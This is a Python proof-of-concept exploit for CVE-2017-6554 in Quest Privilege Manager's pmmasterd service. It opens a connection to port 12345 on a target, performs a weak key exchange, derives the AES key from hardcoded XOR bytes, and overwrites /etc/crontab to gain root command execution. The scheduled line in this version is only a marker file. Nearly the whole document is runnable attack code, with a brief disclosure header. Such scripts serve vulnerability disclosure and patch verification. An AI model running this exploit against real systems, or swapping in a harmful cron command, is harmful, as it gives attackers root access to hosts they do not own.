#!/usr/bin/env python2

"""
# Exploit Title: Quest Privilege Manager pmmasterd Arbitrary File Write
# Date: 10/Mar/2017
# Exploit Author: m0t
# Vendor Homepage: https://www.quest.com/products/privilege-manager-for-unix/
# Version: 6.0.0-27, 6.0.0-50
# Tested on: ubuntu 14.04 x86_64, ubuntu 16.04 x86, ubuntu 12.04 x86
# CVE : 2017-6554

REQUIREMENTS
- Root privs are required to bind a privileged source port
- python hexdump: pip install hexdump


This PoC gains arbitrary command execution by overwriting /etc/crontab
In case of successful exploitation /etc/crontab will contain the following line
* * * * * root touch /tmp/pwned


"""

import binascii as b
import hexdump as h
import struct
import sys
import socket
from Crypto.Cipher import AES

cipher=None
def create_enc_packet(action, len1=None, len2=None, body=None):
    global cipher
    if body == None:
        body_raw = b.unhexlify("50696e6745342e362e302e302e32372e")
    else:
        body_raw = b.unhexlify(body)
        #pad
    if len(body_raw) % 16 != 0:
        body_raw += "\x00" * (16 - (len(body_raw) % 16))
    enc_body = cipher.encrypt(body_raw)
    
    if len1 == None:
        len1 = len(body_raw)
    if len2 == None:
        len2 = len(enc_body)
    head = struct.pack('>I', action) + struct.pack('>I', len1) + struct.pack('>I', len2) + '\x00'*68
    return head+enc_body

def decrypt_packet(packet):
    global cipher
    return cipher.decrypt(packet[80:])

def create_packet(action, len1=None, len2=None, body=None):
    if body == None:
        body = "50696e6745342e362e302e302e32372e"
    if len1 == None:
        len1 = len(body)/2
    if len2 == None:
        len2 = len1
    head = struct.pack('>I', action) + struct.pack('>I', len1) + struct.pack('>I', len2) + '\x00'*68
    return head+b.unhexlify(body)

#extract action code from first 4b, return action found
def get_action(packet):
    code = struct.unpack('>I',packet[:4])[0]
    return code

def generate_aes_key(buf):
    some_AES_bytes = [
      0xDF, 0x4E, 0x34, 0x05, 0xF4, 0x4D, 0x19, 0x22, 0x98, 0x4F, 
      0x58, 0x62, 0x2C, 0x2A, 0x54, 0x42, 0xAA, 0x76, 0x53, 0xD4, 
      0xF9, 0xDC, 0x98, 0x90, 0x23, 0x49, 0x71, 0x12, 0xEA, 0x33, 
      0x12, 0x63
    ];
    retbuf = ""
    if len(buf) < 0x20:
        print("[-] initial key buffer too small, that's bad")
        return None
    for i in range(0x20):
        retbuf+= chr(ord(buf[i])^some_AES_bytes[i])
    return retbuf

def main():
    global cipher

    if len(sys.argv) < 2:
        print("usage: %s <target ip> [<sport>]" % sys.argv[0])
        sys.exit(-1)

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if len(sys.argv) > 2:
        sport = int(sys.argv[2])
    else:
        sport = 666

    s.bind(("0.0.0.0", sport))
    s.connect((sys.argv[1], 12345))


    try:
        s.send(create_packet(0xfa, body=b.hexlify("/etc/crontab")))
        #s.send(create_packet(0x134))
        print("[+] sent ACT_NEWFILESENT")
        resp=s.recv(1024)
        h.hexdump(resp)
        action=get_action(resp)
        if action == 212:
            print("[+] server returned 212, this is a good sign, press Enter to continue")
        else:
            print("[-] server returned %d, exploit will probably fail, press CTRL-C to exit or Enter to continue" % action)
        sys.stdin.readline()
        print("[+] exchanging DH pars")
        dh="\x00"*63+"\x02"
        s.send(dh)
        dh=s.recv(1024)
        h.hexdump(dh)
        aes_key = generate_aes_key(dh)
        print("[+] got AES key below:")
        h.hexdump(aes_key)
        cipher=AES.new(aes_key)
        print("[+] press Enter to continue")
        sys.stdin.readline()

        print("[+] sending:")
        enc=create_enc_packet(0xfb, body=b.hexlify("* * * * * root touch /tmp/pwned\n"))
        h.hexdump(enc)
        s.send(enc )
        enc=create_enc_packet(0xfc, body="")
        h.hexdump(enc)
        s.send(enc )

        print("[+] got:")
        resp=s.recv(1024)
        h.hexdump(resp)
        print("[+] trying decrypt")
        h.hexdump(decrypt_packet(resp))

        s.close()
    except KeyboardInterrupt:
        s.close()
        exit(-1)

main()